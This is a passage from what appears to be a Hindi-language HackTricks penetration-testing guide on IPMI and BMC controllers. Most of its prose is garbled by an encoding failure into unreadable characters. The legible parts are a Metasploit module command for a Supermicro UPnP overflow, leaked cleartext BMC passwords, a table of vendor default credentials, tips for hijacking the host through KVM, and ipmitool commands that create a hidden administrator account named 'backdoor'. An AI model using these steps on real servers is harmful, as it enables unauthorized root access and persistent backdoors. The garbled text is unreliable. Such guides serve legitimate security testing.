рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
```bash
cat /nv/PSBlock
admin                      ADMINpassword^TT                    rootOtherPassword!
```
### рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ - рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ IPMI UPnP

рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ рдЕрдкрдиреА рд╣рд╛рд▓ рдХреА рдорджрд░рдмреЛрд░реНрдбреЛрдВ рдХреЗ IPMI рдлрд░реНрдорд╡реЗрдпрд░ рдкрд░ **UDP рдкреЛрд░реНрдЯ 1900 рдкрд░ UPnP SSDP рд╕реБрдирдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рд▓рд┐рд╕реНрдЯрдирд░ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ**ред SMT\_X9\_218 рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдпрд╣ рд╕реЗрд╡рд╛ рдЗрдВрдЯреЗрд▓ SDK for UPnP Devices, рд╕рдВрд╕реНрдХрд░рдг 1.3.1 рдЪрд▓рд╛ рд░рд╣рд╛ рдерд╛ред рдЗрд╕ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ [рд░реИрдкрд┐рдб7 рдиреЗ рдЦреБрд▓рд╛рд╕рд╛ рдХрд┐рдпрд╛](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) рдерд╛, рдФрд░ рдЗрд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрдкрд╛рджрди рдирд┐рд╢рд╛рди рд╣реИ Metasploit Framework рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ **BMC рдХреЛ рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**, рдЬреЛ рдЕрдиреНрдпрдерд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рд╢рд╛рд╕рдХреАрдп рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░, рдпрд╛ рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░реВрдЯ рд╢реИрд▓ рдореЗрдВ рдПрдХ рд╢реИрд▓ рдореЗрдВ, рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ BMC рдХреЗ рдлрд░реНрдорд╡реЗрдпрд░ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рд░ **рд░реВрдЯ** рдПрдХреНрд╕реЗрд╕ **рдкреНрд░рд╛рдкреНрдд** рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ **рд╕рд╛рдлрд╝ рдкрд╛рдареНрдпрдХреНрд░рдо** рдкрдврд╝рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ, **рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ BMC рдореЗрдВ рд╕реНрдерд╛рдпреА **рдмреИрдХрдбреЛрд░** рдПрдХреАрдХрд░рдг рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ рдХреЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкреВрд░реНрдг рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рдХреЛ рднреА рдЬреАрд╡рд┐рдд рд░рдЦреЗрдЧрд╛ред
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ рдПрдЪрдкреА рдирд┐рд░реНрдорд╛рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдпрд╛рджрдЧрд╛рд░ рдмрдирд╛рддрд╛ рд╣реИред

| рдЙрддреНрдкрд╛рдж рдирд╛рдо                                        | рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ | рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб                         |
| --------------------------------------------------- | ---------------- | ---------------------------------------- |
| **рдПрдЪрдкреА рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рд▓рд╛рдЗрдЯреНрд╕ рдЖрдЙрдЯ (iLO)**                  | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ    | \<рдлреИрдХреНрдЯреНрд░реА рд░реИрдВрдбрдорд╛рдЗрдЬрд╝реНрдб 8-рд╡рд░реНрдгреАрдп рд╕реНрдЯреНрд░рд┐рдВрдЧ> |
| **рдбреЗрд▓ рд░рд┐рдореЛрдЯ рдПрдХреНрд╕реЗрд╕ рдХрд╛рд░реНрдб (iDRAC, DRAC)**           | рд░реВрдЯ             | calvin                                   |
| **рдЖрдИрдмреАрдПрдо рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рдореИрдиреЗрдЬрдореЗрдВрдЯ рдореЙрдбреНрдпреВрд▓ (IMM)**          | USERID           | PASSW0RD (рд╢реВрдиреНрдп рдХреЗ рд╕рд╛рде)                   |
| **рдлреБрдЬрд┐рддреНрд╕реБ рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рд░рд┐рдореЛрдЯ рдореИрдиреЗрдЬрдореЗрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓рд░** | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ            | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ                                    |
| **рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ IPMI (2.0)**                           | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ            | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ                                    |
| **рдУрд░реЗрдХрд▓ / рд╕рди рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рд▓рд╛рдЗрдЯреНрд╕ рдЖрдЙрдЯ рдореИрдиреЗрдЬрд░ (ILOM)** | рд░реВрдЯ             | changeme                                 |
| **рдПрдПрд╕рдпреВрдПрд╕ рдЖрдИрдХреЗрд╡реАрдПрдо рдмреАрдПрдорд╕реА**                                   | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ            | рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ                                    |

## BMC рд╕реЗ рд╣реЛрд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реЛрд╖рдг

рдПрдХ рдмреАрдПрдорд╕реА рдХреЗ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣реЛрд╕реНрдЯ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрд░реАрдХреЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рд╕реАрдзрд╛ рдорд╛рд░реНрдЧ рдпрд╣ рд╣реИ рдХрд┐ рдмреАрдПрдорд╕реА рдХреЗ KVM рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЛ рдПрдХ рд░реВрдЯ рд╢реИрд▓реА (GRUB рдореЗрдВ init=/bin/sh) рдпрд╛ рдПрдХ рд░реЗрд╕реНрдХреНрдпреВ рдбрд┐рд╕реНрдХ рдХреЛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рд╕реАрдбреА-рд░реЙрдо рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдмреВрдЯ рдХрд░реЗрдВред рд╣реЛрд╕реНрдЯ рдХреЗ рдбрд┐рд╕реНрдХ рдХрд╛ рд╕реАрдзрд╛ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рдмреИрдХрдбреЛрд░ рджрд░реНрдЬ рдХрд░рдирд╛, рд╣рд╛рд░реНрдб рдбреНрд░рд╛рдЗрд╡ рд╕реЗ рдбреЗрдЯрд╛ рдХреЙрдкреА рдХрд░рдирд╛, рдпрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛрддрд╛ рд╣реИред рдмрдбрд╝рд╛ рдиреБрдХрд╕рд╛рди, рдмреЗрд╢рдХ, рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рдХреЛ рд░рд┐рдмреВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдХреНрдпрд╛ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рд╣реЛрд╕реНрдЯ рдХреА рднреМрддрд┐рдХ рдХрдВрд╕реЛрд▓ рд▓реЙрдЧ рдЗрди рдЫреЛрдбрд╝ рджреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЗрд╕реЗ рдЕрдВрддрд░реНрдЬрд╛рд▓реАрдп рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рд╣рд╛рдЗрдЬреИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рд╣реА рддрд░реАрдХрд╛ рдзрд╛рд░реАрджрд╛рд░ рдХрдВрд╕реЛрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рднреА рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ - рдпрджрд┐ рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рд╕рддреНрд░ рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдмреАрдПрдорд╕реА рд╕реАрд░рд┐рдпрд▓-рдУрд╡рд░-рд▓реИрди (sol) рдХреЗ рд▓рд┐рдП ipmitool рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдорд╛рд░реНрдЧ рдЬрд┐рд╕реЗ рдЕрднреА рднреА рдЕрдзрд┐рдХ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд╡рд╣ рд╣реИ рд╕рд╛рдЭрд╛ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдЬреИрд╕реЗ i2c рдмрд╕ рдФрд░ рд╕реБрдкрд░ I/O рдЪрд┐рдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_bios.png)

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_boot.png)

![](<../.gitbook/assets/image (202) (2).png>)

## рд╣реЛрд╕реНрдЯ рд╕реЗ BMC рдХрд╛ рд╢реЛрд╖рдг

рдЬрд╣рд╛рдВ рдПрдХ BMC рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, **BMC рдХреЗ рд╕реНрдерд╛рдиреАрдп рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмреИрдХрдбреЛрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рд╕рд░реНрд╡рд░ рдкрд░ рд╕реНрдерд╛рдпреА рдЖрдзрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП, **рд╣реЛрд╕реНрдЯ рдкрд░ `ipmitool` рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** рдФрд░ BMC рдХреЗ рд▓рд┐рдП рдбреНрд░рд╛рдЗрд╡рд░ рд╕рдорд░реНрдерди рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд╛рдиреАрдп рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рддреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, BMC рдореЗрдВ рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рддрд░реАрдХрд╛ рд▓рд┐рдирдХреНрд╕, рд╡рд┐рдВрдбреЛрдЬ, рдмреАрдПрд╕рдбреА, рдФрд░ рдбреЙрд╕ рд▓рдХреНрд╖реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рд╣реИред
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## рд╢реЛрдбрди

* `рдкреЛрд░реНрдЯ: 623`

## рд╕рдВрджрд░реНрдн

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
* [https://academy.hackthebox.com/module/112/section/1245](https://academy.hackthebox.com/module/112/section/1245)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>
